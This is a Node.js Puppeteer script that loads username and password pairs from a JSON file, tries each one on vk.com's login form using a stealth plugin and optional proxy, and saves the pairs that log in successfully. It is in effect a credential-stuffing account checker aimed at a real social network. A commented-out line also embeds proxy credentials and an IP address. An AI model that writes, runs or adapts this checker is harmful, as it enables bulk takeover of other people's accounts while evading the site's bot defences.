'use strict';

const fs = require('fs');
const useProxy = require('puppeteer-page-proxy');

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

const creds = JSON.parse(fs.readFileSync('testCredentials.json').toString());
puppeteer.use(StealthPlugin());

(async() => {
  let result = [];
  for (let i = 0; i < creds.length; i++) {
    console.log(`Current item number = ${i + 1}`);
    result = await check(creds[i], result);
  }
  const resultFileName = 'result.json';
  console.log(JSON.stringify(result));
  fs.writeFileSync(resultFileName, Buffer.from(JSON.stringify(result)));
})();

async function check (cred, result) {
  const browser = await puppeteer.launch({ headless: false });

  const page = await browser.newPage();
  // await useProxy(page, 'http://deaddebed6606:e28fa1@193.23.50.40:10389');
  await page.goto('https://vk.com');

  try {
    await clickSignIn(page);
    await enterUserName(page, cred.user);
    await enterPassword(page, cred.passw);

    if (await isSuccess(page)) {
      console.log(`\nSuccessful login user = ${cred.user} pass = ${cred.passw}\n`);
      result.push({
        user: cred.user,
        pass: cred.passw
      })
    }
    else if (await isPasswordIncorrect(page)) {
      console.log(`\nPassword incorrect user = ${cred.user}, pass =  cred.passw\n`);
    }
    else {
      console.log(`\nSuspicious  user = ${cred.user}, pass = ${cred.passw}\n`);
      await page.screenshot({ path: `${cred.user}.png`, fullPage: true });
    }
  }
  catch (ex) {
    console.log(`Exception - ${ex}`);
    await page.screenshot({ path: `${cred.user}.png`, fullPage: true });
  }
  await browser.close();
  return Promise.resolve(result);
}


async function clickSignIn(page) {
  await page.waitForSelector('button.VkIdForm__signInButton');
  await page.$eval( 'button.VkIdForm__signInButton', btn => btn.click() );
}

async function enterUserName(page, user) {
  await page.waitForSelector('input.vkc__TextField__input');
  await page.focus('input.vkc__TextField__input');
  await page.keyboard.type(user);
  await page.$eval( 'div.vkc__EnterLogin__button > button', btn => btn.click() );
}

async function enterPassword(page, pass) {
  await page.waitForSelector('div.vkc__EnterPasswordNoUserInfo__input');
  await page.waitForTimeout(1000);
  await page.focus('input.vkc__TextField__input');
  await page.keyboard.type(pass);

  await page.waitForSelector('div.vkc__EnterPasswordNoUserInfo__buttonWrap > button');
  return page.$eval( 'div.vkc__EnterPasswordNoUserInfo__buttonWrap > button', btn => btn.click() );
}

async function isPasswordIncorrect(page) {
  try {
    await page.waitForSelector('.vkc__TextField__tooltip > .vkc__TextField__text');
    console.log(await page.$('.vkc__TextField__tooltip > .vkc__TextField__text'))
    const content = await (await page.$('.vkc__TextField__tooltip > .vkc__TextField__text')).evaluate(el => el.textContent);
    return Promise.resolve(content != null && content === 'Incorrect password');
  }
  catch (ex) {
    return Promise.resolve(false);
  }
}

async function isSuccess(page) {
  await page.waitForTimeout(3000);
  const checkSuccess = await page.$('img.TopNavBtn__profileImg');
  return Promise.resolve(checkSuccess != null);
}

